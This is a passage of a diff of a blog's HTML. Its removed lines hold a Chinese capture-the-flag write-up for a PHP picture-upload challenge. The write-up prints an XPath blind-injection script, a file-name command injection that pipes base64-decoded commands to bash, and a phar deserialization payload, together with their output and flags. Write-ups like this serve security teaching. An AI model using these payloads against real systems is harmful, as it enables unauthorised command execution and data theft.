Error(&quot;hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $num = substr_count($filename, &quot;.&quot;);</span><br><span class="line">        if ($num != 1)&#123;</span><br><span class="line">            throw new Error(&quot;hacker!&quot;);    </span><br><span class="line">        &#125;</span><br><span class="line">        if (!is_file($filename))&#123;</span><br><span class="line">            throw new Error(&quot;???&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        $this-&gt;size = filesize($filename);</span><br><span class="line">        $this-&gt;lasttime = filemtime($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function remove()&#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function show()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Filename: &quot;. $this-&gt;filename. &quot;  Last Modified Time: &quot;.$this-&gt;lasttime. &quot;  Filesize: &quot;.$this-&gt;size.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system(&quot;ls -all &quot;.$this-&gt;filename);   // this-&gt;filename shell ???</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;]))&#123;</span><br><span class="line">  echo &#x27;</span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br><span class="line">  $xml = simplexml_load_file(&#x27;/tmp/secret.xml&#x27;);   // xml secret</span><br><span class="line">  if($_POST[&#x27;submit&#x27;])&#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">    $x_query=&quot;/accounts/user[username=&#x27;&#123;$username&#125;&#x27; and password=&#x27;&#123;$password&#125;&#x27;]&quot;;   //xpath查询</span><br><span class="line">    $result = $xml-&gt;xpath($x_query);</span><br><span class="line">    if(count($result)==0)&#123;</span><br><span class="line">      echo &#x27;登录失败&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $_SESSION[&#x27;user&#x27;] = $username;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if ($_SESSION[&#x27;user&#x27;] !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">        unset($_SESSION[&#x27;user&#x27;]);</span><br><span class="line">        echo &quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  echo &quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;;   // file = </span><br><span class="line">  if (!$_GET[&#x27;file&#x27;]) &#123;</span><br><span class="line">    foreach (scandir(&quot;.&quot;) as $filename) &#123;</span><br><span class="line">      if (preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123;</span><br><span class="line">        echo &quot;&lt;a href=&#x27;index.php/?file=&quot; . $filename . &quot;&#x27;&gt;&quot; . $filename . &quot;&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;</span><br><span class="line">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span><br><span class="line">  &#x27;;</span><br><span class="line">    if ($_FILES[&#x27;file&#x27;]) &#123;</span><br><span class="line">      $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">      if (!preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123;   //回溯机制绕过 但是这里为get方法</span><br><span class="line">        die(&quot;hacker!&quot;);          // 文件名后缀绕过</span><br><span class="line">      &#125;</span><br><span class="line">      if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $filename)) &#123;    </span><br><span class="line">          echo &quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        die(&#x27;failed&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">      $filename = $_GET[&#x27;file&#x27;];         //</span><br><span class="line">      if ($_GET[&#x27;todo&#x27;] === &quot;md5&quot;)&#123;      </span><br><span class="line">          echo md5_file($filename);</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          $file = new FILE($filename);</span><br><span class="line">          if ($_GET[&#x27;todo&#x27;] !== &quot;remove&quot; &amp;&amp; $_GET[&#x27;todo&#x27;] !== &quot;show&quot;) &#123;</span><br><span class="line">              echo &quot;&lt;img src=&#x27;../&quot; . $filename . &quot;&#x27;&gt;&lt;br&gt;&quot;;</span><br><span class="line">              echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">              echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">          &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;remove&quot;) &#123;</span><br><span class="line">              $file-&gt;remove();</span><br><span class="line">              echo &quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;  //删除可以用条件竞争？ </span><br><span class="line">          &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;show&quot;) &#123;</span><br><span class="line">              $file-&gt;show();                                        </span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>XPath盲注原理</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63701832/article/details/129777163">https://blog.csdn.net/qq_63701832/article/details/129777163</a></p>
-<p>和sql盲注原理相似，但是要注意判断节点</p>
-<p>这里有贴一个大佬的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://5af02f69-5563-4d7c-a665-736452e37077.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="comment">#猜测根节点名称 #accounts</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123,&quot;submit&quot;:&quot;1&quot;&#125;  accounts</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测子节点名称 #user</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(name(/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j)   user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码 #admin #003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)、</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payload_username =<span class="string">&quot;&#x27;or substring(/accounts/user/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-<p>然后讲爆出来的字符串进行md5解密,用somd5在线解密网站来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">003d7628772d6b57fec5f30ccbc82be1  ==&gt;  15035371139</span><br></pre></td></tr></table></figure>
-
-<p>直接登陆，看到一个文件上传界面</p>
-<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);   <span class="comment">// this-&gt;filename shell ???</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里有文件名命令注入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">echo</span> bHMgLw===|<span class="built_in">base64</span> -d|bash;test.png</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total 12 -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 <span class="string">&#x27;;.jpg drwxrwxrwx 1 www-data www-data 4096 Aug 21 15:17 . drwxr-xr-x 1 root root 18 Oct 13 2020 .. -rw-r--r-- 1 www-data www-data 0 Aug 21 15:15 ;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;test.png -rw-r--r-- 1 www-data www-data 0 Aug 21 15:17 ;echo bHMgLw===|base64 -d|bash;test.png -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 echo &#x27;</span>hello<span class="string">&#x27;;.jpg -rw-r--r-- 1 www-data www-data 0 Aug 21 15:16 echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;test.png -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 echo.jpg -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 echo;.jpg -rw-rw-r-- 1 root root 3575 Jul 19 08:49 index.php -rw-r--r-- 1 www-data www-data 0 Aug 21 15:09 ppp.jpg -rw-rw-r-- 1 root root 1475 Jul 19 08:49 y0u_cant_find_1t.zip adjaskdhnask_flag_is_here_dakjdnmsakjnfksd bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">echo</span> Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|<span class="built_in">base64</span> -d|bash;test.png</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remove</span><br><span class="line">show</span><br><span class="line">total 12 -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 <span class="string">&#x27;;.jpg drwxrwxrwx 1 www-data www-data 4096 Aug 21 15:17 . drwxr-xr-x 1 root root 18 Oct 13 2020 .. -rw-r--r-- 1 www-data www-data 0 Aug 21 15:15 ;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;test.png -rw-r--r-- 1 www-data www-data 0 Aug 21 15:17 ;echo bHMgLw===|base64 -d|bash;test.png -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 echo &#x27;</span>hello<span class="string">&#x27;;.jpg -rw-r--r-- 1 www-data www-data 0 Aug 21 15:16 echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;test.png -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 echo.jpg -rw-r--r-- 1 www-data www-data 0 Aug 21 15:13 echo;.jpg -rw-rw-r-- 1 root root 3575 Jul 19 08:49 index.php -rw-r--r-- 1 www-data www-data 0 Aug 21 15:09 ppp.jpg -rw-rw-r-- 1 root root 1475 Jul 19 08:49 y0u_cant_find_1t.zip DASCTF&#123;fe956a03-3c06-4fed-a8d6-78914acd6e1f&#125; </span></span><br></pre></td></tr></table></figure>
-
-<p>这个利用Base64解密，管道|符传送，传递给bash命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">让我们分解这个命令的各个部分：</span><br><span class="line"></span><br><span class="line">- `<span class="built_in">echo</span> Y2F0IGZsYWcudHh0`：这部分使用`<span class="built_in">echo</span>`命令将字符串`Y2F0IGZsYWcudHh0`输出到标准输出。这个字符串是一个经过Base64编码的代码。</span><br><span class="line"></span><br><span class="line">- `|<span class="built_in">base64</span> -d`：这部分使用管道操作符（`|`）将前一个命令的输出作为输入传递给`<span class="built_in">base64</span> -d`命令。`<span class="built_in">base64</span> -d`命令用于解码Base64编码的字符串。</span><br><span class="line"></span><br><span class="line">- `|bash`：这部分使用管道操作符将前一个命令的输出作为输入传递给`bash`命令。`bash`命令用于执行Shell脚本。</span><br><span class="line"></span><br><span class="line">- `test.png`：这部分是一个文件名，可能是作为一个伪装的图片文件名，但在这个命令中并没有被使用。</span><br><span class="line"></span><br><span class="line">所以，这个命令的目的是将经过Base64编码的代码解码并传递给`bash`命令执行。由于这段代码是未知的且可能是恶意的，执行此命令可能会导致系统被攻击或受到损害。因此，不建议执行此命令。</span><br></pre></td></tr></table></figure>
-
-<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><p>FILE类中的 <strong>md5_file()  is_file()   unlink()</strong> 都可以触发phar反序列化 </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];         </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;      </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
-
-<p>生成phartest.phar,上传文件phartest.png</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f84d423a-19fe-44d8-bb31-47929ce3a691.node4.buuoj.cn:81/index.php?file=phar://phartest.png&amp;todo=md5</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total 4 drwxr-xr-x 1 root root 89 Aug 22 03:33 . drwxr-xr-x 1 root root 89 Aug 22 03:33 .. -rwxr-xr-x 1 root root 0 Aug 22 03:33 .dockerenv -rw-rw-r-- 1 root root 45 Aug 22 03:33 adjaskdhnask_flag_is_here_dakjdnmsakjnfksd drwxr-xr-x 1 root root 28 Oct 13 2020 bin drwxr-xr-x 2 root root 6 Sep 19 2020 boot drwxr-xr-x 5 root root 360 Aug 22 03:33 dev drwxr-xr-x 1 root root 66 Aug 22 03:33 etc drwxr-xr-x 2 root root 6 Sep 19 2020 home drwxr-xr-x 1 root root 21 Oct 13 2020 lib drwxr-xr-x 2 root root 34 Oct 12 2020 lib64 drwxr-xr-x 2 root root 6 Oct 12 2020 media drwxr-xr-x 2 root root 6 Oct 12 2020 mnt drwxr-xr-x 2 root root 6 Oct 12 2020 opt dr-xr-xr-x 4654 root root 0 Aug 22 03:33 proc drwx------ 1 root root 6 Oct 13 2020 root drwxr-xr-x 1 root root 21 Oct 13 2020 run drwxr-xr-x 1 root root 20 Oct 13 2020 sbin drwxr-xr-x 2 root root 6 Oct 12 2020 srv dr-xr-xr-x 13 root root 0 Mar 28 03:11 sys drwxrwxrwt 1 root root 51 Aug 22 03:38 tmp drwxr-xr-x 1 root root 19 Oct 12 2020 usr drwxr-xr-x 1 root root 17 Oct 13 2020 var DASCTF&#123;e689207b-0456-4db6-a782-681b674b8264&#125; </span><br></pre></td></tr></table></figure>
-
-<p>DASCTF{fe956a03-3c06-4fed-a8d6-78914acd6e1f}</p>
-<h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>考点为pearcmd</p>
-<p>pearcmd利用前提条件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 有文件包含点</span><br><span class="line">2 开启了pear扩展   （可以当他是一个框架）</span><br><span class="line">3 配置文件中register_argc_argv 设置为On,而默认为Off（<span class="variable">$_SERVER</span>[‘argv’]生效）</span><br><span class="line">4 找到pear文件的位置，默认位置是/usr/local/lib/php/ </span><br></pre></td></tr></table></figure>
-
-<p><strong>PEAR扩展默认安装位置是： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;</strong></p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/08/25/hello-world/" class="article-date">
-      <time datetime="2023-08-24T16:49:55.000Z" itemprop="datePublished">2023-08-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/08/25/hello-world/">article</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>hello!Welcome to Harder’ Blog!</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hello-world/" rel="tag">hello world</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-  
+<div class="social">
 </div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                &copy; 2023 John Doe
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
-            </div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
         </div>
-        
-            <div class="visit">
-                
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >海贼到访数: 
-                            <span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
-                
-                
-                    <span>, </span>
-                
-                
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit">本页阅读量: 
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
-                
-            </div>
-        
-    </div>
-</footer>
-
-    </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
     
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-
-<script src="/js/main.js"></script>
-
-
-    <script>
-        $(document).ready(function() {
-            var backgroundnum = 24;
-            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
-            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-        })
-    </script>
-
-
-
-
-
-<div class="scroll" id="scroll">
